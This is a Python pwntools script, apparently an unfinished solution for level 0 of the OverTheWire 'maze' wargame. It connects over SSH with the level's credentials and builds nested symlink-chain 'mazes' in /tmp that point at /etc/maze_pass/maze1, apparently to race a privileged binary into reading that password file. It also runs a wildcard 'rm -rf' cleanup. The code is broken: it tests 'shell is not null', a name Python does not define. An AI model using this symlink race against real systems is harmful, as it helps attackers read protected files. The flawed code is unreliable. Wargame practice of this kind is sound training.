#base of filesystem maze creation solution.... unfinished
#!/usr/bin/python3
from pwn import *
import os
import time

#Level information for ssh
level = 0
USER = 'maze%s' % level
HOST = 'maze.labs.overthewire.org'
PASS = 'maze0'
PORT = 2225

#Maze depth/chain length vars
maze_depth=30
maze_chains=10
num_mazes=3

#Target file and 'access' file
target_file = "/etc/maze_pass/maze1"
activedir = "/tmp/128ecf542a35ac5270a87dc740918404"
public_file = "/tmp/tald0/public"
#context.log_level = "debug"

#Connect to level and establish a shell
def connect_to_level():
    log.info("Attempting to connect to " + USER + "@" + HOST + " on port " + str(PORT) + "...")
    sh = ssh(user=USER, host=HOST, password=PASS, port=PORT)
    log.success("Success connecting...")
    #Establish shell
    log.info("Creating shell...")
    shell = sh.run('/bin/bash')
    log.success("Established shell")
    return shell


#Create filesystem maze
def create_maze(shell, maze_num):
    base = "/tmp/tald0/maze" + str(maze_num)
    exit_file = base + "/exit"
    m = log.progress("Creating maze " + str(maze_num) + "...")
    shell.sendline("mkdir " + base)
    sentry = base + "/sentry"
    if maze_num%2 == 0:
        link_chain(shell, exit_file, target_file)
    else:
        link_chain(shell, exit_file, public_file)
    all_chains = []
    if shell is not null:
        for chain_num in range(0, maze_chains):
            chain = base + "/chain" + str(chain_num)
            time.sleep(0.03)
            shell.sendline("mkdir " + chain)
            chain += '/d'*maze_depth
            time.sleep(0.03)
            #print(chain)
            shell.sendline("mkdir -p " + chain)
            if chain_num != 0:
                link_chain(shell, chain + "/lnk", all_chains[-1][:17])
            all_chains.append(chain)
        #After chains are created and linked, link 'entry' file (/tmp/128...) to chain6
        link_chain(shell, sentry, all_chains[-1][:24])        
        #then link 'chain0..../lnk' to /etc/maze_pass/maze1
        link_chain(shell, all_chains[0], target_file)
        m.success("Created maze " + str(maze_num))

def link_chain(shell, src, dest):
    time.sleep(0.03)
    log.debug("Linking " + src + " to " + dest)
    shell.sendline("ln -s " + dest + " " + src)

def wipe_maze(shell):
    w = log.progress("Wiping maze...")
    if shell is not null:
        time.sleep(0.3)
        shell.sendline("rm -f " + activedir)
        time.sleep(0.3)
        shell.sendline("rm -rf /tmp/tald0/*")
        time.sleep(0.3)
        #shell.sendline("y")
        w.success("Maze wiped")

def execute_maze(shell):
    log.info("Executing maze0...")
    shell.sendline("/maze/maze0")

shell = connect_to_level()
shell.sendline("touch /tmp/tald0/public")
for i in range(0, num_mazes):
    create_maze(shell, i)

#execute_maze(shell)
#wipe_maze(shell)
